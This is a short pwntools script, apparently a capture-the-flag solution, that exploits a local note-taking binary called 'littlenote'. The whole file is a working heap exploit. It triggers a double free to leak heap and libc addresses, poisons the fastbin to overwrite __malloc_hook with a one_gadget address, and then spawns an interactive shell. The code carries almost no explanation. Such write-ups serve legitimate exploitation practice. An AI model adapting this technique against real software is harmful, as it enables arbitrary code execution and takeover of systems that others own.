from pwn import *

#context.log_level="debug"
p = process("./littlenote")
libc = ELF("./libc.so.6")

def add(data):
    p.recvuntil("choice:")
    p.sendline(str(1))
    p.recvuntil("your note")
    p.send(data)
    p.recvuntil("keep your note?")
    p.send("Y\x00")

def show(idx):
    p.recvuntil("choice:")
    p.sendline(str(2))
    p.recvuntil("show?")
    p.sendline(str(idx))

def dele(idx):
    p.recvuntil("choice:")
    p.sendline(str(3))
    p.recvuntil("delete?")
    p.sendline(str(idx))

add("A"*0x10)
add("B"*0x10)
add("C"*0x10)
add("D"*0x10+p64(0)+p64(0x51))
dele(1)
dele(0)
dele(1)
show(0)
p.recvline()
heap = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))
print hex(heap)
add(p64(heap+0x10)+p64(0x71))
add("\x00")
add(p64(heap+0x10)+p64(0x71))
add("F"*0x50+p64(0)+p64(0x91))
dele(2)
show(2)
p.recvline()
main = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))
libc_addr = (main - 88) - 0x3C4B20
print hex(libc_addr)
malloc_hook = libc_addr + libc.symbols['__malloc_hook']
print hex(malloc_hook)
add("1"*0x10) #8
add("2"*0x10) #9
add("3"*0x10)
dele(9)
dele(8)
dele(9)
add(p64(malloc_hook-27-0x8))
add("5"*0x10)
add(p64(malloc_hook-27-0x8))
one_gadget = 0xf0274
add("A"*19+p64(libc_addr + one_gadget))
p.recvuntil(":")
p.sendline(str(1))
p.interactive()